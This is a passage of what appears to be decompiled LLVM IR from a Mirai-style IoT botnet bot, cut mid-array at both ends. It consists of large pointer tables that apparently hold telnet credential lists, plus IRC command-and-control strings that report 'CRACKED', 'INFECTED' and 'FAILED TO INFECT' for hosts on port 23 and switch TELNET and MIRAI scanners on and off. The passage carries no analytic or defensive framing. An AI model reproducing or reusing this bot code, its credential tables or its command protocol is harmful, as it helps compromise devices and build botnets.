i8], [8 x i8]* @global_var_356b4.774, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_356bc.775, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_356c4.776, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_356cc.777, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_356d8.778, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_356e0.779, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_356e8.780, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_356f4.781, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_356fc.782, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_35704.783, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_3570c.784, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_35714.785, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_3571c.786, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_35724.787, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_3572c.788, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_35738.789, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_35740.790, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_35748.791, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_35750.792, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_35758.793, i32 0, i32 0)]
@global_var_38634.796 = constant [53 x i8] c"PRIVMSG %s :[TELNET-GIGANET] INFECTED - %s:23 %s:%s\0A\00"
@global_var_3866c.798 = constant [60 x i8] c"PRIVMSG %s :[TELNET-GIGNET] FAILED TO INFECT - %s:23 %s:%s\0A\00"
@global_var_4509c.801 = global [128 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_367a8.259, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_36780.255, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_368a4.286, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_36914.299, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36798.257, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_36920.300, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36930.301, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36860.279, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367a0.258, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36938.302, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36888.283, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_367c8.263, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36944.303, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368fc.296, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3694c.304, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_36954.305, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36850.277, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36868.280, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36964.306, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36820.272, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_367f4.267, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36898.285, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36834.274, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36980.309, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367d0.264, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_368d8.292, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368c0.289, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36988.310, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36890.284, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36990.311, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36860.279, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36998.312, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36754.250, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_3687c.282, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36980.309, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36834.274, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_367a8.259, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36870.281, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367d0.264, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_369a4.313, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3682c.273, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_368e0.293, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3682c.273, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36930.301, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36870.281, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_369b0.314, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_368a4.286, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_36914.299, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36870.281, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36930.301, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36860.279, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367a0.258, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36938.302, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36888.283, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_367c8.263, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36944.303, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368fc.296, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3694c.304, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_36954.305, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36850.277, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36868.280, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36964.306, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36820.272, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_367f4.267, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36898.285, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36834.274, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36980.309, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367d0.264, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_368d8.292, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368c0.289, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36988.310, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_369b8.315, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_369c0.316, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_369c8.317, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_369d4.318, i32 0, i32 0)]
@global_var_45194.804 = global [66 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36890.284, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36990.311, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36860.279, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36998.312, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36754.250, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_3687c.282, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36980.309, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36834.274, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_367a8.259, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36870.281, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367d0.264, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_369a4.313, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3682c.273, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_368e0.293, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3682c.273, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36930.301, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36870.281, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_369b0.314, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_368a4.286, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_36914.299, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36870.281, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36930.301, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36860.279, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367a0.258, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36938.302, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36888.283, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_367c8.263, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36944.303, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368fc.296, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3694c.304, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_36954.305, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36850.277, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36868.280, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36964.306, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36820.272, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_367f4.267, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36898.285, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36834.274, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36980.309, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367d0.264, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_368d8.292, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368c0.289, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36988.310, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_369b8.315, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_369c0.316, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_369c8.317, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_369d4.318, i32 0, i32 0)]
@global_var_386a8.808 = constant [51 x i8] c"PRIVMSG %s :[MIRAI-GIGANET] CRACKED - %s:23 %s:%s\0A\00"
@global_var_386dc.813 = constant [52 x i8] c"PRIVMSG %s :[MIRAI-GIGANET] INFECTED - %s:23 %s:%s\0A\00"
@global_var_38710.815 = constant [60 x i8] c"PRIVMSG %s :[MIRAI-GIGANET] FAILED TO INFECT - %s:23 %s:%s\0A\00"
@global_var_49b34.817 = global i32 0
@global_var_3874c.820 = constant [29 x i8] c"NOTICE %s :SCANNER <ON/OFF>\0A\00"
@global_var_3876c.822 = constant [3 x i8] c"ON\00"
@global_var_38770.824 = constant [3 x i8] c"on\00"
@global_var_38774.828 = constant [43 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER STARTED!\0A\00"
@global_var_387a0.830 = constant [51 x i8] c"PRIVMSG %s :[TELNET] [-] FAILED TO START SCANNER!\0A\00"
@global_var_387d4.832 = constant [51 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER ALREADY STARTED!\0A\00"
@global_var_38808.834 = constant [4 x i8] c"OFF\00"
@global_var_3880c.836 = constant [4 x i8] c"off\00"
@global_var_38810.838 = constant [42 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER KILLED!\0A\00"
@global_var_3883c.840 = constant [50 x i8] c"PRIVMSG %s :[TELNET] [-] FAILED TO KILL SCANNER!\0A\00"
@global_var_38870.842 = constant [47 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER NOT STARTED!\0A\00"
@global_var_388a0.844 = constant [27 x i8] c"NOTICE %s :MIRAI <ON/OFF>\0A\00"
@global_var_388bc.850 = constant [42 x i8] c"PRIVMSG %s :[MIRAI] [+] SCANNER STARTED!\0A\00"
@global_var_388e8.852 = constant [50 x i8] c"PRIVMSG %s :[MIRAI] [-] FAILED TO START SCANNER!\0A\00"
@global_var_3891c.854 = constant [50 x i8] c"PRIVMSG %s :[MIRAI] [+] SCANNER ALREADY STARTED!\0A\00"
@global_var_38950.858 = constant [41 x i8] c"PRIVMSG %s :[MIRAI] [+] SCANNER KILLED!\0A\00"
@global_var_3897c.860 = constant [49 x i8] c"PRIVMSG %s :[MIRAI] [-] FAILED TO KILL SCANNER!\0A\00"
@global_var_389b0.862 = constant [46 x i8] c"PRIVMSG %s :[MIRAI] [+] SCANNER NOT STARTED!\0A\00"
@global_var_44af0.864 = global [114 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_35418.681, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_35420.682, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_3542c.683, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_35434.684, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3543c.685, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_35444.686, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_3544c.687, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35450.688, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35454.689, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_35458.690, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_35460.691, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_35468.692, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_35470.693, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_35478.694, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_35480.695, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_35488.696, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_35498.697, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_354a0.698, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_354a8.699, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_354b0.700, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_354b8.701, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_354c0.702, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354c8.703, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354cc.704, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354d0.705, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354d4.706, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354d8.707, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354dc.708, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354e0.709, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354e4.710, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354e8.711, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_354ec.712, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_354f0.713, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_354f4.714, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_354f8.715, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_354fc.716, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35500.717, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35504.718, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35508.719, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_3550c.720, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35510.721, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35514.722, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_35518.723, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_3552c.724, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_35538.725, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_35540.726, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_35548.727, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_35550.728, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_3555c.729, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_35568.730, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_35574.731, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_35580.732, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_35588.733, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_35590.734, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_3559c.735, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_355a8.736, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_355b4.737, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_355c0.738, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_355c8.739, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_355d4.740, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_355e4.741, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_355ec.742, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_355f4.743, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_35600.744, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_3560c.745, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_35618.746, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_35620.747, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_35624.748, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* 